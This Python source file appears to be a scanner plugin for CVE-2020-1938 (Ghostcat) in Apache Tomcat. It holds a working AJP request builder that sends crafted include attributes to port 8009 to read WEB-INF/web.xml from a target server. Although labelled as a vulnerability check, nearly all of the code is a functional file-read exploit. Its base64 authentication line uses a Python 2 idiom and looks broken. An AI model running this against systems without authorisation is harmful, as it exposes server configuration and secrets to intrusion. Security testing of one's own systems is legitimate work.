#!/usr/bin/env python3

import socket
from urllib.parse import urlparse
from app.plugins.http.Tomcat.ajpy import AjpForwardRequest

class CVE_2020_1938_BaseVerify(object):
    def __init__(self, url):
        self.info = {
            'name': ' CVE-2020-1938漏洞',
            'description': 'CVE-2020-1938文件包含漏洞,可查看任意文件内容,影响范围为: Apache Tomcat 9.0.0.M1~9.0.0.30, 8.5.0~8.5.50, 7.0.0~7.0.99',
            'date': '2019-12-02',
            'exptype': 'check',
            'type': 'File Include'
        }
        self.url = url
        url_parse = urlparse(self.url)
        self.host = url_parse.hostname
        self.port = url_parse.port
        if not self.port:
            self.port = '8009'

    def prepare_ajp_forward_request(self, host, req_uri, method=AjpForwardRequest.GET):
        fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
        fr.method = method
        fr.protocol = "HTTP/1.1"
        fr.req_uri = req_uri
        fr.remote_addr = host
        fr.remote_host = None
        fr.server_name = host
        fr.server_port = 80
        fr.request_headers = {
            'SC_REQ_ACCEPT': 'text/html',
            'SC_REQ_CONNECTION': 'keep-alive',
            'SC_REQ_CONTENT_LENGTH': '0',
            'SC_REQ_HOST': host,
            'SC_REQ_USER_AGENT': 'Mozilla',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en-US,en;q=0.5',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        fr.is_ssl = False
        fr.attributes = []
        return fr

    async def check(self, headers={}, method='GET', user = None, password = None):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.connect((self.host, int(self.port)))
            self.stream = self.socket.makefile("rb")
            self.attributes=[
                {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
                {'name':'req_attribute','value':['javax.servlet.include.path_info','WEB-INF/web.xml']},
                {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
            ]
            self.req_uri = '/'
            self.forward_request = self.prepare_ajp_forward_request(self.host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
            # print("Getting resource at ajp13://%s:%s%s" % (self.host, self.port, self.req_uri))
            if user is not None and password is not None:
                self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
            for h in headers:
                self.forward_request.request_headers[h] = headers[h]
            for a in self.attributes:
                self.forward_request.attributes.append(a)
            responses = self.forward_request.send_and_receive(self.socket, self.stream)
            if len(responses) == 0:
                return None, None
            snd_hdrs_res = responses[0]
            data_res = responses[1:-1]
            if len(data_res) == 0:
                print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
                return True
            data = "".join([d.data.decode('utf-8') for d in data_res])
            #print('存在CVE-2020-1938漏洞,查看WEB-INF/web.xml内容为:', data)
            return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    import asyncio
    CVE_2020_1938 = CVE_2020_1938_BaseVerify('http://127.0.0.1:8009')
    asyncio.run(CVE_2020_1938.check())
    